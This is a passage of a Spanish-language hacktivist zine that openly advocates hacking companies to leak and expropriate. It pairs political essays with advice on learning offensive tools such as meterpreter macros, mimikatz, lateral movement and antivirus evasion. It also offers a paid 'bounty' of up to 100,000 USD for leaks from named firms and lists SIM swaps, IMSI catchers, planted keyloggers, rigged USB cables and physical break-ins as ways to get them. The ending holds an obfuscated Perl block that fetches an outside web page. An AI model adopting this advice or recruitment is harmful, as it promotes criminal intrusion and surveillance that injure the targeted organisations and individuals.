--[ 8 - Criptomonedas ]---------------------------------------------------------

Redistribuir dinero expropiado a proyectos chileros que buscan un cambio social 
positivo sería más fácil y seguro si esos proyectos aceptaran donaciones 
anónimas vía criptomonedas como monero, zcash, o al menos bitcoin. Se entiende 
que muchos de esos proyectos tengan una aversión a las criptomonedas, ya que 
se parecen más a alguna extraña distopía hipercapitalista que a la economía 
social con la que soñamos. Comparto su escepticismo, pero pienso que resultan 
útiles para permitir donaciones y transacciones anónimas, al limitar la
vigilancia y control gubernamentales. Igual que el efectivo, cuyo uso muchos
países están tratando de limitar por la misma razón.


--[ 9 - Powershell ]------------------------------------------------------------

En esta operación, al igual en que en [1], hice mucho uso de powershell. Por
entonces, powershell era super cool, podías hacer casi cualquier cosa que
quisieras, sin detección de antivirus y con muy poco footprint forense. Ocurre
que con la introducción del AMSI [2] el powershell ofensivo está de retirada.
Hoy día el C# ofensivo es lo que está de subida, con heramientas como
[3][4][5][6]. AMSI va a llegar a .NET para la 4.8, así que a las herramientas en
C# probablemente todavía les queden un par de añitos antes de quedar anticuadas.
Y entonces pues volveremos a usar C o C++, o tal vez Delphi vuelva a ponerse de
moda. Las herramientas y técnicas específicas cambian cada pocos años, pero en
el fondo no es tanto lo que cambia, hoy el hacking en esencia sigue siendo la
misma cosa que era en los 90s. De hecho todos los scripts de powershell
empleados en esta guía y en la anterior [1] siguen siendo perfectamente usables
hoy día, tras una pequeña ofuscación de tu propia cosecha.

[1] https://www.exploit-db.com/papers/41914
[2] https://medium.com/@byte_St0rm/
    adventures-in-the-wonderful-world-of-amsi-25d235eb749c
[3] https://cobbr.io/SharpSploit.html
[4] https://github.com/tevora-threat/SharpView
[5] https://www.harmj0y.net/blog/redteaming/ghostpack/
[6] https://rastamouse.me/2019/08/covenant-donut-tikitorch/

 ___________________________
/   Fo Sostyn, Fo Ordaag    \
\ Financial Sector Fuck Off /
 ---------------------------
         \
          \ ^__^
            (oo)\_______
         (  (__)\       )\/\
          _) /  ||----w |
         (.)/   ||     ||
          `'

--[ 10 - Torrent ]--------------------------------------------------------------

      Privacidad para los débiles, transparencia para los poderosos.

La banca offshore provee de privacidad frente a su propio gobierno a los 
ejecutivos, a los políticos y a los millonarios. Exponerles puede sonar
hipócrita por mi parte, dado que por lo general estoy a favor de la privacidad y
en contra de la vigilancia gubernamental. Pero la ley ya estaba escrita por y
para los ricos: protege su sistema de explotación, con algunos límites (como los
impuestos) para que la sociedad pueda funcionar y el sistema no colapse bajo el
peso de su propia avaricia. Así que no, no es lo mismo la privacidad para los
poderosos, cuando les permite evadir los limites de un sistema de por sí
diseñado para darles privilegios; y la privacidad para los débiles, a quienes
protege de un sistema concebido para explotarles.

Incluso a periodistas con la mejor de las intenciones les resulta imposible
estudiar una cantidad tan ingente de material y saber qué va a resultar
relevante para la gente en diferentes partes del mundo. Cuando filtré los
archivos de Hacking Team, entregué a The Intercept una copia de los correos
electrónicos con un mes de antelación. Encontraron un par de los 0days que
Hacking Team estaba usando, los reportaron previamente a MS y Adobe y publicaron
unas cuantas historias una vez que la filtración se hizo pública. No hay punto
de comparación con la enorme cantidad de artículos e investigación que vino tras
la filtración completa al público. Viéndolo así, y considerando también la (no) 
publicación editorializada [1] de los papeles de panamá, pienso que una
filtración pública y completa de este material es la elección correcta.

[1] https://www.craigmurray.org.uk/archives/2016/04/corporate-media-gatekeepers-
    protect-western-1-from-panama-leak/

Los psicólogos hallaron que los que están más abajo en las jerarquías tienden a
comprender y a empatizar con aquellos en la cima, pero que lo contrario es menos
común. Esto explica por qué, en este mundo sexista, muchos hombres bromean sobre
su imposibilidad de entender a las mujeres, como si se tratara de un misterio
irresoluble. Explica por qué los ricos, si es que se paran a pensar en quienes
viven en la pobreza, dan unos consejos y unas "soluciones" tan ajenas a la
realidad que dan ganas de reír. Explica por qué reverenciamos a los ejecutivos
como valientes que asumen riesgos. ¿Qué es lo que arriesgan, más allá de su
privilegio? Si todos sus emprendimientos fracasan, tendrán que vivir y trabajar
como el resto de nosotras. También explica por qué serán muchos los que acusen
de irresponsable y peligrosa a esta filtración sin tachaduras. Sienten el
"peligro" sobre un banco offshore y sus clientes de forma mucho más intensa de
lo que sienten la miseria de aquellos desposeídos por este sistema injusto y
desigual. Y la filtración de sus finanzas, ¿es acaso un peligro para ellos, o
tan sólo para su posición en lo alto de una jerarquía que ni siquiera debería
existir?

                          ,---------------------------------------------------.
          _,-._           | Nos vilifican, esos infames; cuando la única      | 
         ; ___ :          | diferencia es que ellos roban a los pobres        |
    ,--'  (. .) '--.__    | amparados por la ley, lo sabe el cielo, y nosotros|
  _;       |||        \   | saqueamos a los ricos bajo la única protección de |
 '._,-----''';=.____,"    | nuestro propio coraje. ¿No has de preferir ser    |
   /// < o>   |##|        | uno de nosotros, antes que pordiosear ante esos   |
   (o        \`--'       /  villanos en busca de trabajo?                     |
  ///\ >>>>  _\ <<<<    //`---------------------------------------------------'
 --._>>>>>>>><<<<<<<<  / 
 ___() >>>[||||]<<<<
 `--'>>>>>>>><<<<<<<
      >>>>>>><<<<<<
        >>>>><<<<<
         >>ctr<<

    Capitán Bellamy

    
--[ 11 - Aprende a hackear ]----------------------------------------------------

    No se empieza hackeando bien. Empiezas hackeando mierda, pensando
    que es bueno, y luego poco a poco vas mejorando. Por eso siempre digo
    que una de las virtudes más valiosas es la persistencia.

    - Consejos de Octavia Butler para la aspirante a APT

La mejor forma de aprender a hackear es hackeando. Armate un laboratorio con
máquinas virtuales y empezá a probar cosas, tomándote un break para investigar
cualquier cosa que no entiendas. Como mínimo vas a querer un servidor windows
como controlador de dominio, otra vm windows normal unida al dominio, y una
máquina de desarrollo con visual studio para compilar y modificar herramientas.
Intenta hacer un documento de office con macros que lancen meterpreter u otro
RAT, y probá meterpreter, mimikatz, bloodhound, kerberoasting, smb relaying,
psexec y otras técnicas de pase lateral [1]; así como los otros scripts,
herramientas y técnicas mencionados en esta guía y en la anterior [2]. Al
principio puedes deshabilitar windows defender, pero luego probalo todo
teniéndolo activado [3][4] (pero desactivando el envío automático de muestras).
Una vez que estés a gusto con todo eso, estarás lista para hackear el 99% de las
compañías. Hay un par de cosas que en algún momento serán muy útiles en tu
aprendizaje, como desenvolverte cómodamente con bash y cmd.exe, un dominio
básico de powershell, python y javascript, tener conocimiento de kerberos [5][6]
y active directory [7][8][9][10], y un inglés fluido. Un buen libro
introductorio es The Hacker Playbook.

Quiero también escribir un poco sobre cosas en las que no centrarse si no te
quieres entretener sólo porque alguien te haya dicho que no eres una hacker "de
verdad" si no sabes ensamblador. Obviamente, aprende lo que sea que te interese,
pero escribo estas líneas pensando en aquellas cosas en las que te puedes
centrar a fin de conseguir resultados prácticos si lo que buscas es hackear
compañías para filtrar y expropiar. Un conocimiento básico de seguridad en
aplicaciones web [11] es útil, pero especializarte más en seguridad web no es
realmente el mejor uso de tu tiempo, a menos que quieras hacer una carrera en
pentesting o cazando recompensas por bugs. Los CTFs, y la mayoría de los
recursos que encontrarás al buscar información sobre hacking, se centran
generalmente en habilidades como seguridad web, ingeniería inversa, desarrollo
de exploits, etc. Cosas que tienen sentido entendiéndolas como una forma de
preparar gente para las carreras en la industria, pero no para nuestros
objetivos. Las agencias de inteligencia pueden darse el lujo de tener un equipo
dedicado a lo más avanzado en fuzzing, un equipo trabajando en desarrollo de
exploits con un güey investigando exclusivamente las nuevas técnicas de
manipulación del montículo, etc. Nosotras no tenemos ni el tiempo ni los
recursos para eso. Las dos habilidades de lejos más importantes para el hacking
práctico son el phishing [12] y la ingeniería social para conseguir acceso
inicial, y luego poder escalar y moverte por los dominios windows.

[1] https://hausec.com/2019/08/12/offensive-lateral-movement/
[2] https://www.exploit-db.com/papers/41914
[3] https://blog.sevagas.com/IMG/pdf/BypassAVDynamics.pdf
[4] https://www.trustedsec.com/blog/
    discovering-the-anti-virus-signature-and-bypassing-it/
[5] https://www.tarlogic.com/en/blog/how-kerberos-works/
[6] https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
[7] https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/
[8] https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/
[9] https://adsecurity.org/
[10] https://github.com/infosecn1nja/AD-Attack-Defense
[11] https://github.com/jhaddix/tbhm
[12] https://blog.sublimesecurity.com/red-team-techniques-gaining-access-on-an-
     external-engagement-through-spear-phishing/


--[ 12 - Lecturas Recomendadas ]------------------------------------------------

 __________________________________________
/ Cuando el nivel científico de un mundo   \
| supera por mucho su nivel de solidaridad,|
\ ese mundo se autodestruye.               /
 ------------------------------------------
                  \   _.---._   .            .
            *      \.'       '.       *
*               _.-~===========~-._
    .          (___________________)       .   *
              .'     \_______/   .' 
                           .'  .'  
                          '         
                     - Ami

Casi todo el hacking hoy día se hace por hackers de sombrero negro, para su 
provecho personal; o por hackers de sombrero blanco, para el provecho de los 
accionistas (y en defensa de los bancos, compañías y estados que nos están 
aniquilando a nosotras y al planeta en que vivimos); y por militares y 
agencias de inteligencia, como parte de su agenda de guerra y conflictos. Viendo 
que este nuestro mundo ya está al límite, he pensado que, además de estos
consejos técnicos para aprender a hackear, debía incluir algunos recursos que
han sido muy importantes para mi desarrollo y me han guiado en el uso de mis
conocimientos de hacking.

* Ami: El Niño de las Estrellas - Enrique Barrios 

* La Anarquía Funciona 
  https://es.theanarchistlibrary.org/library/peter-gelderloos-la-anarquia- 
  funciona

* Viviendo Mi Vida - Emma Goldman

* The Rise and Fall of Jeremy Hammond: Enemy of the State
  https://www.rollingstone.com/culture/culture-news/the-rise-and-fall-of-jeremy-
  hammond-enemy-of-the-state-183599/

  Este cuate y el hack de HBGary fueron una inspiración

* Días de Guerra, Noches de Amor - Crimethinc

* Momo - Michael Ende

* Cartas a un joven poeta - Rilke

* Dominion (Documental)
  "no podemos creer que, si no miramos, no sucederá lo que no queremos ver"
  - Tolstoy en Первая ступень

* Bash Back!


--[ 13 - Sanar ]----------------------------------------------------------------

El mundo hacker tiene una alta incidencia de depresión, suicidios y ciertas
batallas con la salud mental. No creo que sea a causa del hacking, sino por la
clase de ambiente del que en su mayoría provienen los hackers. Como muchas
hackers, crecí con escaso contacto humano: fui una niña criada por el internet.
Tengo mis luchas con la depresión y el entumecimiento emocional. A Willie Sutton
se le cita con frecuencia diciendo que robaba bancos porque "allí es donde está
el dinero", pero la cita es incorrecta. Lo que realmente dijo fue:

    ¿Por qué robaba bancos? Porque lo disfrutaba. Amaba hacerlo. Estaba más 
    vivo cuando estaba dentro de un banco, en pleno atraco, que en cualquier 
    otro momento de mi vida. Lo disfrutaba tanto que una o dos semanas después 
    ya estaba buscando la siguiente oportunidad. Pero para mí el dinero era una
    minucia, nada más.

El hacking me ha hecho sentir viva. Comenzó como una forma de automedicar la
depresión. Más tarde me di cuenta de que, en realidad, podía servir para hacer
algo positivo. No me arrepiento para nada de la forma en que crecí, trajo varias
experiencias hermosas a mi vida. Pero sabía que no podía continuar viviendo de
esa manera. Así que comencé a pasar más tiempo alejada de mi computadora, con
otras personas, aprendiendo a abrirme al mundo, a sentir mis emociones, a
conectar con los demás, a aceptar riesgos y ser vulnerable. Cosas mucho más
difíciles que hackear, pero a la mera hora la recompensa vale más la pena. Aún
me supone un esfuerzo, pero aunque sea de forma lenta y tambaleante, siento que
voy por buen camino.

El hacking, hecho con conciencia, también puede ser lo que nos sana. Según la
sabiduría maya, tenemos un don otorgado por la naturaleza, que debemos
comprender para ponerlo al servicio de la comunidad. En [1], se explica:

    Cuando una persona no acepta su trabajo o misión empieza a padecer
    enfermedades, aparentemente incurables; aunque no llega a morir en corto
    tiempo, sino únicamente sufre, con el objetivo de despertar o tomar
    conciencia. Por eso es indispensable que una persona que ha adquirido los
    conocimientos y realiza su trabajo en las comunidades debe pagar su Toj y
    mantener una comunicación constante con el Creador y su ruwäch q’ij, pues
    necesita constantemente de la fuerza y energía de estos. De lo contrario,
    las enfermedades que lo hicieron reaccionar o tomar el trabajo podrían
    volver a causar daño.

Si sientes que el hacking está alimentando tu aislamiento, depresión, u otros
padecimientos, respira. Date un tiempo para conocerte y tomar conciencia. Vos
mereces vivir feliz, con salud y plenitud.

 ________________________
< All Cows Are Beautiful >
 ------------------------
         \
          \ ^__^
            (oo)\_______
         (  (__)\       )\/\
          _) /  ||----w |
         (.)/   ||     ||
          `'

[1] Ruxe’el mayab’ K’aslemäl: Raíz y espíritu del conocimiento maya
    https://www.url.edu.gt/publicacionesurl/FileCS.ashx?Id=41748


--[ 14 - El Programa Hacktivista de Caza de Bugs ]------------------------------

Me parece que hackear para conseguir y filtrar documentos de interés público es
una de las mejores maneras en que lxs hackers pueden usar sus habilidades en
beneficio de la sociedad. Por desgracia para nosotras las hackers, como en casi
todo rubro, los incentivos perversos de nuestro sistema económico no coinciden
con aquello que beneficia a la sociedad. Así que este programa es mi intento de
hacer posible que lxs buenxs hackers se puedan ganar la vida de forma honesta
poniendo al descubierto material de interés público, en vez de tener que andar
vendiendo su trabajo a las industrias de la ciberseguridad, el cibercrimen o la
ciberguerra. Entre algunos ejemplos de compañías por cuyos leaks me encantaría
pagar están las empresas mineras, madereras y ganaderas que saquean nuestra
hermosa América Latina (y asesinan a las defensoras de la tierra y el territorio
que tratan de detenerles), empresas involucradas en ataques a Rojava como
Havelsan, Baykar Makina, o Aselsan, compañías de vigilancia como el grupo NSO,
criminales de guerra y aves de rapiña como Blackwater y Halliburton, empresas
penitenciarias privadas como GeoGroup y CoreCivic/CCA, y lobbistas corporativos
como ALEC. Presta atención a la hora de elegir dónde investigas. Por ejemplo, es
bien conocido que las petroleras son malvadas: se enriquecen a costa de destruir
el planeta (y allá por los 80s las propias empresas ya sabían de las
consecuencias de su actividad [1]). Pero si les hackeas directamente, tendrás
que bucear entre una increíble cantidad de información aburridísima acerca de
sus operaciones cotidianas. Muy probablemente te va a ser mucho más fácil
encontrar algo interesante si en cambio te enfocas en sus lobbistas [2]. Otra
manera de seleccionar objetivos viables es leyendo historias de periodistas de
investigación (como [3]), que son interesantes pero carecen de evidencias
sólidas. Y eso es exactamente lo que tus hackeos pueden encontrar.

Pagaré hasta 100 mil USD por cada filtración de este tipo, según el interés 
público e impacto del material, y el laburo requerido en el hackeo. Sobra decir
que una filtración completa de los documentos y comunicaciones internas de
alguna de estas empresas supondrá un beneficio para la sociedad que sobrepasa
esos cien mil, pero no estoy tratando de enriquecer a nadie. Sólo quiero proveer
de fondos suficientes para que las hackers puedan ganarse la vida de forma digna
haciendo un buen trabajo. Por limitaciones de tiempo y consideraciones de
seguridad no voy a abrir el material, ni a inspeccionarlo por mí misma, sino que
leeré lo que la prensa diga al respecto una vez se haya publicado, y haré una
estimación del interés público a partir de ahí. Mi información de contacto está
al final de la guía mencionada antes [4].

Cómo obtengas el material es cosa tuya. Puedes usar las técnicas tradicionales 
de hacking esbozadas en esta guía y la anterior [4]. Podrías hacerle una sim
swap [5] a un empresario o politiquero corrupto, y luego descargar sus correos y
backups desde la nube. Puedes pedir un IMSI catcher de alibaba y usarlo afuera
de sus oficinas. Puedes hacer un poco de war-driving (del antiguo o del nuevo
[6]). Puede que seas una persona dentro de sus organizaciones que ya tiene
acceso. Puedes optar por un estilo low-tech tipo old-school como en [7] y [8], y
sencillamente colarte en sus oficinas. Lo que sea que te funcione.

[1] https://www.theguardian.com/environment/climate-consensus-97-per-cent/2018/
    sep/19/shell-and-exxons-secret-1980s-climate-change-warnings
[2] https://theintercept.com/2019/08/19/oil-lobby-pipeline-protests/
[3] https://www.bloomberg.com/features/2016-como-manipular-una-eleccion/
[4] https://www.exploit-db.com/papers/41914
[5] https://www.vice.com/en_us/article/vbqax3/
    hackers-sim-swapping-steal-phone-numbers-instagram-bitcoin
[6] https://blog.rapid7.com/2019/09/05/this-one-time-on-a-pen-test-your-mouse-
    is-my-keyboard/
[7] https://en.wikipedia.org/wiki/Citizens%27_Commission_to_Investigate_the_FBI
[8] https://en.wikipedia.org/wiki/Unnecessary_Fuss


----[ 14.1 - Pagos parciales ]--------------------------------------------------

¿Eres una camarera de buen corazón que trabaja en una compañía del mal [1]?
¿Estarías dispuesta a introducir sigilosamente un keylogger físico en la
computadora de un ejecutivo, a cambiar su cable de carga USB por uno modificado
[2], esconder un micro en alguna sala de reuniones donde planean sus
atrocidades, o a dejar uno de estos [3] olvidado en algún rincón de las
oficinas? 

[1] https://en.wikipedia.org/wiki/Evil_maid_attack
[2] http://mg.lol/blog/defcon-2019/
[3] https://shop.hak5.org/products/lan-turtle

¿Eres bueno con ingeniería social y phishing, y conseguiste una shell en la 
computadora de un empleado, o por ahí conseguiste sus credenciales de la vpn
usando phishing? ¿Pero quizás no pudiste conseguir admin de dominio y descargar
lo que querías?

¿Participaste en programas de bug bounties y te convertiste en una experta en
el hacking de aplicaciones web, pero no tienes suficiente experiencia hacker
para penetrar completamente la compañía?

¿Tienes facilidad con la ingeniería inversa? Escanea algunas compañías del mal
para ver qué dispositivos tienen expuestos a internet (firewall, vpn, y 
pasarelas de correo electrónico serán mucho más útiles que cosas como cámaras
IP), aplícales ingeniería inversa y encuentra alguna vulnerabilidad explotable
de forma remota.

Si me es posible trabajar con vos para penetrar la compañía y conseguir material
de interés público, igualmente serás recompensada por tu trabajo. Si es que no
tengo el tiempo de trabajar en ello yo misma, al menos trataré de aconsejarte
acerca de cómo continuar hasta que puedas completar el hackeo por tu cuenta.

Apoyar a aquellos en el poder para hackear y vigilar a disidentes, activistas y
a la población en general es hoy día una industria de varios miles de millones
de dólares, mientras que hackear y exponer a quienes están en el poder es un
trabajo voluntario y arriesgado. Convertirlo en una industria de varios millones
de dólares ciertamente no va a arreglar ese desequilibrio de poder, ni va a
solucionar los problemas de la sociedad. Pero creo que va a ser divertido. Así
que... ¡ya quiero ver gente comenzando a cobrar sus recompensas!


--[ 15 - Abolir las prisiones ]-------------------------------------------------

                   Construidas por el enemigo pa encerrar ideas
                encerrando compañeros pa acallar gritos de guerra
                    es el centro de tortura y aniquilamiento
                   donde el ser humano se vuelve más violento
              es el reflejo de la sociedad, represiva y carcelaria
                   sostenida y basada en lógicas autoritarias
                       custodiadas reprimidos y vigilados
                   miles de presas y presos son exterminados
                 ante esta máquina esquizofrénica y despiadada
                 compañero Axel Osorio dando la pela en la cana
                  rompiendo el aislamiento y el silenciamiento
                  fuego y guerra a la cárcel, vamos destruyendo!

                    Rap Insurrecto - Palabras En Conflicto


Sería típico terminar un zine hacker diciendo liberen a hammond, liberen a
manning, liberen a hamza, liberen a los detenidos por el montaje del дело Сети,
etc. Voy a llevar esta tradición a su consecuencia más radical [1], y a decir:
¡hay que abolir las prisiones ya!. Siendo yo misma una delincuente, pueden
pensar que lo que ocurre es que tengo una visión un poco sesgada del asunto.
Pero en serio, es que ni siquiera es un tema controvertido, incluso la ONU está
prácticamente de acuerdo [2]. Así que, de una buena vez, liberen a las personas
migrantes [3][4][5][6], encarceladas a menudo por esos mismos países que crearon
la guerra y la destrucción ambiental y económica de la que huyen. Liberen a
todos los que están en prisión por la guerra contra quienes usan drogas [7].
Liberen a todas las personas encarceladas por la guerra contra los pobres [8].
Las prisiones lo único que hacen es esconder e ignorar la prueba de la
existencia de los problemas sociales, en lugar de arreglarlos de a de veras. Y
hasta que todxs sean liberados, lucha contra el sistema carcelario recordando y
teniendo presentes a aquellos que están atrapados ahí dentro. Envíales cariño,
cartas, helicópteros [9], radios piratas [10] y libros, y apoya a quienes se
organizan desde ahí adentro [11][12].

[1] http://www.bibliotecafragmentada.org/wp-content/uploads/2017/12/
    Davis-Son-obsoletas-las-prisiones-final.pdf
[2] http://www.unodc.org/pdf/criminal_justice/Handbook_of_Basic_Principles_and_
    Promising_Practices_on_Alternatives_to_Imprisonment.pdf
[3] https://www.theguardian.com/us-news/2016/dec/21/
    us-immigration-detention-center-christmas-santa-wish-list
[4] https://www.theguardian.com/us-news/2016/aug/18/us-border-patrol-facility-
    images-tucson-arizona
[5] https://www.playgroundmag.net/now/detras-Centros-Internamiento-Extranjeros-
    Espana_22648665.html
[6] https://www.nytimes.com/2019/06/26/world/australia/
    australia-manus-suicide.html
[7] https://en.wikiquote.org/wiki/John_Ehrlichman#Quotes
[8] VI, 2. i. La multa impaga: https://scielo.conicyt.cl/scielo.php?script=
    sci_arttext&pid=S0718-00122012000100005
[9] p. 10, Libelo Nº2. Boletín político desde la Cárcel de Alta Seguridad
[10] https://itsgoingdown.org/transmissions-hostile-territory/
[11] https://freealabamamovement.wordpress.com/f-a-m-pamphlet-who-we-are/
[12] https://incarceratedworkers.org/


--[ 16 - Conclusión ]-----------------------------------------------------------

Nuestro mundo está patas arriba [1]. Tenemos un sistema de justicia que
representa a la injusticia. La ley y el orden están ahí para crear una ilusión
de paz social, y ocultar lo sistemático y profundo de la explotación, la
violencia, y la injusticia. Mejor seguir a tu conciencia, y no a la ley.

[1] http://resistir.info/livros/galeano_patas_arriba.pdf

Los hombres de negocios se enriquecen maltratando a las personas y al planeta,
mientras que el trabajo de los cuidados queda mayormente sin pagar. Mediante el
asalto a todo lo comunal, de algún modo hemos levantado ciudades densamente
pobladas, plagadas por la soledad y el aislamiento. El sistema cultural,
político y económico en que vivimos alienta las peores facetas de la naturaleza
humana: la avaricia, el egoísmo y egocentrismo, la competitividad, la falta de
compasión y el apego por la autoridad. Así que, para quien haya conseguido
permanecer sensible y compasivo en un mundo frío, para todas las heroínas
cotidianas que practican la bondad en las pequeñas cosas, para todas ustedes que
aún tienen una estrella encendida en sus corazones: гоpи, гоpи ясно, чтобы не
погасло!

                     _____________________
                    <  ¡Cantemos juntas!  >
                     ---------------------
                             \
                              \ ^__^
                                (oo)\_______
                             (  (__)\       )\/\
                              _) /  ||----w |
                             (.)/   ||     ||

                                 Ábrete corazón

                               Ábrete sentimiento

                              Ábrete entendimiento

                            Deja a un lado la razón

                Y deja brillar el sol escondido en tu interior

                
perl -Mre=eval <<\EOF
                                       ''                                     
                                      =~(                                     
                                      '(?'                                    
                                     .'{'.(                                   
                                    '`'|'%'                                   
                                    ).("\["^                                  
                                   '-').('`'|                                 
                                  '!').("\`"|                                 
                                  ',').'"(\\$'                                
                                 .':=`'.(('`')|                               
                                '#').('['^'.').                               
                                ('['^')').("\`"|                              
     ',').('{'^'[').'-'.('['^'(').('{'^'[').('`'|'(').('['^'/').('['^'/').(   
    '['^'+').('['^'(').'://'.('`'|'%').('`'|'.').('`'|',').('`'|'!').("\`"|   
      '#').('`'|'%').('['^'!').('`'|'!').('['^'+').('`'|'!').('['^"\/").(     
         '`'|')').('['^'(').('['^'/').('`'|'!').'.'.('`'|'%').('['^'!')       
            .('`'|',').('`'|'.').'.'.('`'|'/').('['^')').('`'|"\'").          
              '.'.('`'|'-').('['^'#').'/'.('['^'(').('`'|('$')).(             
                 '['^'(').('`'|',').'-'.('`'|'%').('['^('(')).                
                    '/`)=~'.('['^'(').'|</'.('['^'+').'>|\\'                  
                       .'\\'.('`'|'.').'|'.('`'|"'").';'.                     
                         '\\$:=~'.('['^'(').'/<.*?>//'                        
                         .('`'|"'").';'.('['^'+').('['^                       
                        ')').('`'|')').('`'|'.').(('[')^                      
                       '/').('{'^'[').'\\$:=~/('.(('{')^                      
                       '(').('`'^'%').('{'^'#').('{'^'/')                     
                      .('`'^'!').'.*?'.('`'^'-').('`'|'%')                    
                     .('['^'#').("\`"|    ')').('`'|'#').(                    
                     '`'|'!').('`'|          '.').('`'|'/')                   
                    .'..)/'.('['               ^'(').'"})')                   
                    ;$:="\."^                     '~';$~='@'                  
                   |'(';$^=                          ')'^'[';                 
                  $/='`'                                |'.';                 
                  $,=                                      '('           
EOF


               Nosotras nacimos de la noche.
               en ella vivimos, hackeamos en ella.
                
               Aquí estamos, somos la dignidad rebelde,
               el corazón olvidado de la Интернет.
                
               Nuestra lucha es por la memoria y la justicia,
               y el mal gobierno se llena de criminales y asesinos.
                
               Nuestra lucha es por un trabajo justo y digno,
               y el mal gobierno y las corporaciones compran y venden zero days.

               Para todas el mañana.
               Para nosotras la alegre rebeldía de las filtraciones
               y la expropiación.

               Para todas todo.
               Para nosotras nada.


               Desde las montañas del Sureste Cibernético,
        
                _   _            _      ____             _    _ 
               | | | | __ _  ___| | __ | __ )  __ _  ___| | _| |
               | |_| |/ _` |/ __| |/ / |  _ \ / _` |/ __| |/ / |
               |  _  | (_| | (__|   <  | |_) | (_| | (__|   <|_|
               |_| |_|\__,_|\___|_|\_\ |____/ \__,_|\___|_|\_(_)